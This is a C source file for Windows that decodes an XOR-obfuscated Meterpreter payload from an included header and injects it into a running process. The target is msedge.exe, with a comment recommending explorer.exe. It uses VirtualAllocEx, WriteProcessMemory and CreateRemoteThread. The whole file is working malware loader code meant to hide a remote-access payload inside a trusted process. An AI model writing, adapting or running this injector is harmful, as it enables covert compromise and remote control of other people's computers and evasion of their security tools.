#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include "buffer.h" // Buffer containing the XORed Meterpreter payload

/* 
 * This function performs an XOR encryption/decryption on the input data.
 *
 * @param data: Pointer to the data to be encrypted/decrypted
 * @param data_len: Length of the data
 *
 * The function XORs each byte of the input data with a fixed key (0xAA).
 * This is a simple and symmetric encryption method, meaning the same 
 * function can be used for both encryption and decryption.
 */
void XOR(unsigned char* data, size_t data_len) {
    for (int i = 0; i < data_len; i++) {
        data[i] = data[i] ^ 0xAA;
    }
}

/*
 * This function finds the process ID (PID) of a target process by its name.
 *
 * @param procname: Name of the target process (Unicode string)
 * 
 * @return process ID of the target process if found, otherwise 0.
 *
 * The function takes a snapshot of all processes in the system and then
 * iterates through them to find a process that matches the given name.
 * If a matching process is found, its process ID is returned.
 */
int FindTarget(const wchar_t* procname) { // Changed to wchar_t for Unicode

    HANDLE hProcSnap;
    PROCESSENTRY32 pe32;
    int pid = 0;

    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcSnap, &pe32)) {
        CloseHandle(hProcSnap);
        return 0;
    }

    while (Process32Next(hProcSnap, &pe32)) {
        if (lstrcmpiW(procname, pe32.szExeFile) == 0) { // Changed to lstrcmpiW for Unicode
            pid = pe32.th32ProcessID;
            break;
        }
    }

    CloseHandle(hProcSnap);

    return pid;
}

/*
 * This function injects a given payload into a target process.
 *
 * @param hProc: Handle to the target process
 * @param buf: Pointer to the buffer containing the code to be injected
 * @param buf_len: Length of the buffer
 *
 * @return 0 if the injection is successful, otherwise -1.
 *
 * The function allocates memory in the target process for the code,
 * writes the code to this allocated memory, and then creates a remote
 * thread in the target process to execute the injected code.
 */
int Inject(HANDLE hProc, unsigned char* buf, unsigned int buf_len) {

    LPVOID pRemoteCode = NULL;
    HANDLE hThread = NULL;

    pRemoteCode = VirtualAllocEx(hProc, NULL, buf_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE); // Ensure page is executable

    WriteProcessMemory(hProc, pRemoteCode, (PVOID)buf, (SIZE_T)buf_len, NULL);

    // Properly casting pRemoteCode to LPTHREAD_START_ROUTINE
    hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, 0, NULL);
    if (hThread != NULL) {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
        return 0;
    }
    return -1;
}

/*
 * The entry point for the application. This function contains the main code for the shellcode injection.
 */
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {

    int pid = 0;
    HANDLE hProc = NULL;

    const wchar_t* target_process = L"msedge.exe"; // Using "explorer.exe", it works very well !

    pid = FindTarget(target_process);

    if (pid == 0) {
        wprintf(L"failed to find %s process\n", target_process);
        return 0;
    }

    hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
        PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
        FALSE, (DWORD)pid);

    if (hProc != NULL) {
        XOR(buf, sizeof(buf));
        Inject(hProc, buf, sizeof(buf));
        CloseHandle(hProc);
    }

    return 0;
}
